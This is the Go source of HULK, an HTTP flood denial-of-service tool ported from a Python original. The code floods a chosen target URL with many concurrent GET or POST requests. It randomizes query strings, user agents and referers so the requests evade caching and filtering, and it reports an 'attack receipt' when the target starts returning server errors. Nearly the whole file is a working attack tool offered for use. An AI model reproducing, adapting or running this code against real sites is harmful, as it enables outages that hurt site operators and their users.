package main

/*
 HULK DoS tool on <strike>steroids</strike> goroutines. Just ported from Python with some improvements.
 Original Python utility by Barry Shteiman http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/

 This go program licensed under GPLv3.
 Copyright Alexander I.Grafov <grafov@gmail.com>

 Updated by Abe Dick <abedick8213@gmail.com>, April 2019
*/

import (
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const version = "1.0.1"

// const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

const (
	onSuccess uint8 = iota
	onError
	onFileError
	on500
)

var currNumReqs int32
var safe = false
var headersReferers = []string{
	"http://www.google.com/?q=",
	"http://www.usatoday.com/search/results?q=",
	"http://engadget.search.aol.com/search?q=",
	//"http://www.google.ru/?hl=ru&q=",
	//"http://yandex.ru/yandsearch?text=",
}
var headersUseragents = []string{
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
	"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
	"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
	"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
}

type arrayFlags []string

func (i *arrayFlags) String() string {
	return "[" + strings.Join(*i, ",") + "]"
}

func (i *arrayFlags) Set(value string) error {
	*i = append(*i, value)
	return nil
}

type config struct {
	maxRequests int
	runningTime time.Duration
	startTime   time.Time
	maxProcs    int
	mu          *sync.Mutex
}

var c *config

func main() {

	c = &config{
		startTime: time.Now(),
		mu:        &sync.Mutex{},
	}

	var versionFlag, safe bool
	var target, agents, data string
	var headers arrayFlags

	flag.IntVar(&c.maxRequests, "max", 0, "Max number of requests, defaults to no maximum")
	flag.IntVar(&c.maxProcs, "maxProcs", 1024, "Size of connection pool")
	flag.BoolVar(&versionFlag, "version", false, "print version and exit")
	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
	flag.StringVar(&target, "target", "", "target url.")
	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
	flag.Parse()

	if versionFlag {
		fmt.Println("HULK", version)
		os.Exit(0)
	}

	if target == "" {
		fmt.Println("must specify target flag with url")
		os.Exit(1)
	}

	targetURL, err := url.Parse(target)
	if err != nil {
		fmt.Println("error parsing url parameter, must specify target flag with url")
		os.Exit(1)
	}

	if agents != "" {
		if data, err := ioutil.ReadFile(agents); err == nil {
			headersUseragents = []string{}
			for _, a := range strings.Split(string(data), "\n") {
				if strings.TrimSpace(a) == "" {
					continue
				}
				headersUseragents = append(headersUseragents, a)
			}
		} else {
			fmt.Printf("can'l load User-Agent list from %s\n", agents)
			os.Exit(1)
		}
	}

	// counters
	var total, success, errs, errFiles int

	m := make(map[string]int)

	go func() {
		resultChan := make(chan uint8, 8)

		fmt.Printf("-- HULK Attack Started --\n   Go!\n\n")
		fmt.Println("In use               |\tResp OK |\tGot err |\tTime (ms)")
		for {

			t := time.Now()

			if atomic.LoadInt32(&currNumReqs) < int32(c.maxProcs-1) {
				go httpcall(target, targetURL.Host, data, headers, resultChan, m)
			}

			if total%10 == 0 || errs%10 == 0 {
				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d  |\t%-20v", currNumReqs, c.maxProcs, success, errs, float64(int64(c.runningTime)/int64(time.Millisecond))/float64(total))
			}

			total++
			switch <-resultChan {
			case onSuccess:
				updateLog(t)
				success++

			case onError:
				updateLog(t)
				atomic.AddInt32(&currNumReqs, -1)
				errs++

			case onFileError:
				updateLog(t)
				c.maxProcs--
				errs++
				errFiles++

			case on500:
				updateLog(t)
				errs++
				report(total, success, errs, m)
			}

			if c.maxRequests != 0 && total > c.maxRequests {
				report(total, success, errs, m)
			}
		}
	}()

	ctlc := make(chan os.Signal)
	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
	<-ctlc

	report(total, success, errs, m)
}

func report(total, success, err int, errors map[string]int) {
	fmt.Println("\n\n-- HULK Attack Receipt -- ")
	fmt.Printf(" %s attack duration\n", time.Since(c.startTime).String())
	fmt.Printf(" %d requests\n", total)
	fmt.Printf(" %d successful responses\n", success)
	fmt.Printf(" %d total errors\n", err)
	fmt.Println("Reported errors")
	for k, v := range errors {
		fmt.Printf("%10d : %v\n", v, k)
	}
	os.Exit(0)
}

func updateLog(t time.Time) {
	timeDelta := time.Since(t)
	c.mu.Lock()
	defer c.mu.Unlock()
	c.runningTime += timeDelta
}

func httpcall(urlstr string, host string, data string, headers arrayFlags, s chan uint8, m map[string]int) {
	atomic.AddInt32(&currNumReqs, 1)

	var param_joiner string
	var client = new(http.Client)

	if strings.ContainsRune(urlstr, '?') {
		param_joiner = "&"
	} else {
		param_joiner = "?"
	}

	for {
		var q *http.Request
		var err error

		if data == "" {
			q, err = http.NewRequest("GET", urlstr+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
		} else {
			q, err = http.NewRequest("POST", urlstr, strings.NewReader(data))
		}

		if err != nil {
			s <- onError
			return
		}

		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		q.Header.Set("Cache-Control", "no-cache")
		q.Header.Set("Accept-Charset", acceptCharset)
		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
		q.Header.Set("Connection", "keep-alive")
		q.Header.Set("Host", host)

		// Overwrite headers with parameters
		for _, element := range headers {
			words := strings.Split(element, ":")
			q.Header.Set(strings.TrimSpace(words[0]), strings.TrimSpace(words[1]))
		}

		r, e := client.Do(q)
		if e != nil {
			errString := ""
			if strings.Contains(e.Error(), "socket: too many open files") {
				errString = "socket: too many open files"
				s <- onFileError
			} else {
				if strings.Contains(e.Error(), "read: connection reset by peer") {
					errString = "read: connection reset by peer"
				} else if strings.Contains(e.Error(), "read: connection refused") {
					errString = "read: connection refused"
				} else if strings.Contains(e.Error(), "connect: can't assign requested address") {
					errString = "connect: can't assign requested address"
				} else {
					errString = e.Error()
				}
				s <- onError
			}
			c.mu.Lock()
			m[errString]++
			c.mu.Unlock()
			return
		}

		r.Body.Close()
		s <- onSuccess

		if r.StatusCode >= 500 {
			s <- on500
		}
	}
}

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}
